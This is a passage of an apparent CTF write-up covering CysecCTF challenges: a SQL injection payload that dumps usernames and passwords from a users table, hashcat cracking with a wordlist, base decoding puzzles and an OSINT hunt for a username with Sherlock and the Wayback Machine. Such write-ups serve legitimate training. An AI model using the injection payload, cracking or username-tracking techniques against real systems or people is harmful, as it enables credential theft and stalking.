/forgotPassword admin'/**/UNION/**/SELECT/**/id,username,password/**/FROM/**/chatbot.users/**/LIMIT/**/2# test
```

Now that settle it we are done.

Flag: `CYSEC{sQLi_1s_everyWHERe!}` 


### Hacker Wordle -- 2000 Point

![image](https://user-images.githubusercontent.com/69868171/169079441-c1d29aa3-c4a3-4f99-a55c-f0635373f63c.png)

Now that would be cool challenge so i download the files but without going to far i got into a issue some missing python modules was missing on my target which required us to download and install `python 3.8` now without wasting to much of time we can do all that with the commands below.

```
wget https://www.python.org/ftp/python/3.8.13/Python-3.8.13.tar.xz
```

Now just relax we are installing it manually now that we have the archive file let extract it.

```
tar -xf Python-3.8.13.tar.xz
```

We should have the archive extracted already in a folder now we can move it.

```
sudo mv Python-3.8.13 /opt/
```

Installing all the dependencies required to install `Python 3.8.` .

```
sudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libsqlite3-dev libreadline-dev libffi-dev curl libbz2-dev pkg-config make -y
```

Now let give it time.

```
cd /opt/Python-3.8.13/
```

We should run the command below to check if all dependencies are present on our system.

```
./configure --enable-optimizations --enable-shared
```

It will optimize the Python binary by running multiple tests now that we have built and configured the environment, it is time to compile it with the command make.

```
make
```

Once we have finished building, let install Python binaries as follows:

```
sudo make altinstall
```

A quick notice it is advised to use the make altinstall command NOT to overwrite the default Python 3 binary system. after the installation is done we need to configure the dynamic linker run time binding with `ldconfig` command.


```
sudo ldconfig /opt/Python-3.8.13
```

Now let confirm if we have everything ready.

![image](https://user-images.githubusercontent.com/69868171/169095895-e1994db8-b15f-42da-9d5a-2176ee05f2ba.png)

Now installing requirement for the `wordle` file.

![image](https://user-images.githubusercontent.com/69868171/169095999-57d5df2d-0044-40a0-ba2f-daf1d3bd4c4b.png)

```
wget https://bootstrap.pypa.io/get-pip.py
```
Next, install the file downloaded.

```
python3.8 get-pip.py
```
Once installed, it is a good idea to check for upgrades.
```
python3.8 -m pip install --upgrade pip
```

Checking if `pip3.8` was installed.

![image](https://user-images.githubusercontent.com/69868171/169096890-b12398b1-2a95-4a16-b2e6-aebe2d7d4461.png)

Now for the requirement.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF]
└─$ cat requirements.txt       
coloroma
random  
```

Can easily use `pip3.8 install -r requirements.txt` to do that now let run the `wordle` file.

![image](https://user-images.githubusercontent.com/69868171/169098119-622fe20d-a5f6-4054-85cf-b35c6881df9f.png)

When i `strings` it i got nothing so i decided to play with it.

![image](https://user-images.githubusercontent.com/69868171/169099015-b1e435ef-226d-430e-b735-a5f29634bc72.png)

Oh only five words cool let play with it.

![image](https://user-images.githubusercontent.com/69868171/169099245-456fd4e2-a3e6-48ed-9567-749767759170.png)

Boom we got it not going to lie am just guessing here that all.


Flag:- `CYSEC{what_a_game_of_wordle!}`


### Back to Base -- 100 Point

![image](https://user-images.githubusercontent.com/69868171/169101477-4c07e9d4-c2cc-468b-99ea-49ad778550e6.png)

Most of the crypto was solve by my litle bro @Abzee you can easily reach him on twitter [Abzee](https://twitter.com/AbzeeSaminu) now `Abzee` would be walking you guys through the crypto challenges.

We are using `cybechef` .

![image](https://user-images.githubusercontent.com/69868171/169104406-bba2b0da-3db3-4a84-9ec0-cb606ec20b0e.png)

```
From base64 ---> Reverse 
```

We have the flag.

Flag:- `CYSEC{B4se-LXIV}`


### Still on Bases -- 100 Point

![image](https://user-images.githubusercontent.com/69868171/169104801-2bdb50a5-d65e-4f76-8939-c9578a5f1c1f.png)


Now that look like base32 let give it a try using `cyberchef` also.

![image](https://user-images.githubusercontent.com/69868171/169105007-2a490f04-631e-441f-a74e-8793040680f8.png)

```
From base32 ---> Reverse
```

Flag:- `CYSEC{B4se-XXXII}`


### Bella Crypter -- 300 Point

![image](https://user-images.githubusercontent.com/69868171/169105301-a37128c9-e411-4d59-ba7f-fdcc2fd17cb9.png)


Trying it with `john the ripper` was so slow.

![image](https://user-images.githubusercontent.com/69868171/169105852-5d2f13e9-5eee-4230-a97e-5739527479d0.png)

But seems we can see the hash type let try using `hashcat` which will be more faster.


![image](https://user-images.githubusercontent.com/69868171/169106027-f5e9d573-86a2-489d-810b-d74e236cae9b.png)


Setting it up with `hashcat` .

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF]
└─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt                                                                                                        139 ⨯
hashcat (v6.1.1) starting...
```

It should take time like time time and boom we should have the cracked hash.

![image](https://user-images.githubusercontent.com/69868171/169110762-f6781b0c-8dfc-44e7-89aa-3f900da233c0.png)

But luckily have done it.

Flag:- `CYSEC{bleh}`


### John Morrison -- 500 Point

![image](https://user-images.githubusercontent.com/69868171/169113272-601775be-3147-432c-8abb-94a904c72157.png)

Let download it.

![image](https://user-images.githubusercontent.com/69868171/169114124-1be58e65-338a-4888-b98a-1cedf28531b4.png)


Seems like a strange one.

![image](https://user-images.githubusercontent.com/69868171/169115448-8bcb7993-b494-403a-a01c-d2dfc7d7a1d6.png)

We are done.

Flag:- `CYSEC-67890-JEDHB29UEYO02UEDDJPH`


### Squished Silence -- 1500 Point

![image](https://user-images.githubusercontent.com/69868171/169117232-9560e34f-a416-480b-8d4c-bcab25f29cb5.png)

I guess minuscule letters are cute, but now i can't make sense of this beautiful mess. help me decode it. Looking up `minuscule` means uppercase and lowercase which is interesting i guess.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF]
└─$ cat rubik.txt       
y3llc2vje2nyexrvz3jhcgh5x2nhbl9izv90aglzx2nyyxp5fq==
```

Let try decoding it online.

![image](https://user-images.githubusercontent.com/69868171/169118848-856aa4e6-42ff-483c-b234-0b0e34206799.png)

By changing it we are getting some interesting stuff hehehehe don't mind @Abzee using phone to solve challenges l33t right.

![image](https://user-images.githubusercontent.com/69868171/169119359-17ab5097-bde6-42d7-a6c7-fc896bec8fa3.png)

As you can see we have gotten `cyesec{cryptography` We need to continue changing it to upper and lower case till we got the right flag.

![image](https://user-images.githubusercontent.com/69868171/169126536-ae03a795-51d4-4e51-8969-06226e31bb14.png)

Bingo and we have our flag by changing d base64 strings upper and lowercase and a little notice seems the flag format was different pretty sure error from there end.

Flag:- `Cyesec{crytography_can_be_this_crazy}`


### Hackerman -- 2000 Point

![image](https://user-images.githubusercontent.com/69868171/169272776-390c917d-ab06-43e0-b4aa-4728a1ab6aa9.png)

We've recently received reports of a script kiddie who goes by the name `detrix01` who goes around hacking into social media accounts using basic techinques. he picks motivation from another hacker. help us find him or them, get us the flag and the predicted country of residence of the hacker.

Open-source intelligence (OSINT) calm down bruh calm down i will be using my best tools [Sherlock](https://github.com/sherlock-project/sherlock) to Hunt down social media accounts by username across social networks which seems cool with out wasting to much of time let hit it.

```
┌──(muzec㉿Muzec-Security)-[~/…/CTFPlayground/CysecCTF/sherlock/sherlock]
└─$ python3 sherlock.py detrix01         
[*] Checking username detrix01 on:


[+] 9GAG: https://www.9gag.com/u/detrix01
[+] AllMyLinks: https://allmylinks.com/detrix01
[+] CNET: https://www.cnet.com/profiles/detrix01/
[+] FortniteTracker: https://fortnitetracker.com/profile/all/detrix01
[+] ICQ: https://icq.im/detrix01/en
[+] Kongregate: https://www.kongregate.com/accounts/detrix01
[+] PCGamer: https://forums.pcgamer.com/members/?username=detrix01
[+] Pinterest: https://www.pinterest.com/detrix01/
[+] Reddit: https://www.reddit.com/user/detrix01
[+] Roblox: https://www.roblox.com/user.aspx?username=detrix01
```

Now that is a headstart going through all links and we found just one interesting one.

![image](https://user-images.githubusercontent.com/69868171/169291166-31ece833-30d5-4dc7-8908-85ba75614ac0.png)

A hint i guess let run `sherlock` on it also to avoid missing anything.

![image](https://user-images.githubusercontent.com/69868171/169292781-ab7f30e7-21c9-400e-b31b-6507b45f5d80.png)

Now going through all links and `https://disqus.com/Albhda` stand out let see what we have on the page.

![image](https://user-images.githubusercontent.com/69868171/169292994-68ce8e9c-c10d-4165-a1aa-6f21e74c4217.png)

```
Damn! a version of me from the past was careless.. But who's good with time travel? "Flag is 404" 
```
 
That is a lead i decided to check it on `way back machine` .

![image](https://user-images.githubusercontent.com/69868171/169294226-6fbc0053-5411-486c-93b8-5c864e7f0945.png)

![image](https://user-images.githubusercontent.com/69868171/169294333-4553aad2-f1f9-4f39-a2b6-08c9c154899c.png)

Hehehehehe awesome let go through some snapshot save bu the `way back machine` .

![image](https://user-images.githubusercontent.com/69868171/169297411-a5db485c-2993-4495-91ed-46c68c5d4b81.png)

```
Rule 1: no system is safe CYSEC-NG{T1m3-Tr4vle-sur3-Rocks} 
```
 
Now that was fast seems we are just missing the `country` only pain pain google searching `Albhda` and got some result.

![image](https://user-images.githubusercontent.com/69868171/169298182-da894bb6-ff67-4fe3-85b4-b0dc76378faa.png)

I spend time trying `italy,rome` and bla bla bla but trying `latin` and boom i got it but does not seems right to me is `latin` a country XD .


Flag:- `CYSEC-NG{T1m3-Tr4vle-sur3-Rocks_Latin}`


Bruhhhhh i guess i should stop here XD.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
